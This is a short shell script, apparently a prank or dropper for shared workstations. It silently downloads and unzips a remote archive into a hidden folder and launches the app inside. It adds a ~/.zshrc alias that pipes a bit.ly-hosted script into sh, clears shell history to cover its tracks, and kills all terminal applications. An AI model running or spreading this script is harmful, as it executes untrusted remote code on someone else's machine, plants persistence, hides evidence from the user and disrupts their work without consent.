mkdir -p ~/goinfre/.dipsie/

curl -s -L https://github.com/ymoustai/spipa7/blob/master/spipa.zip?raw=true -o ~/goinfre/.dipsie/spipa7.zip > /dev/null

unzip -o ~/goinfre/.dipsie/spipa7.zip -d ~/goinfre/.dipsie/ > /dev/null

nohup open ~/goinfre/.dipsie/blyat.app > /dev/null

if [ `alias | grep dipsie | wc -l` -eq 0 ]; then
  echo "alias dipsie='curl -s -L bit.ly/spipa7 | sh'" >> ~/.zshrc
fi

clear
history -c

killall iTerm
killall Terminal
killall iTerm2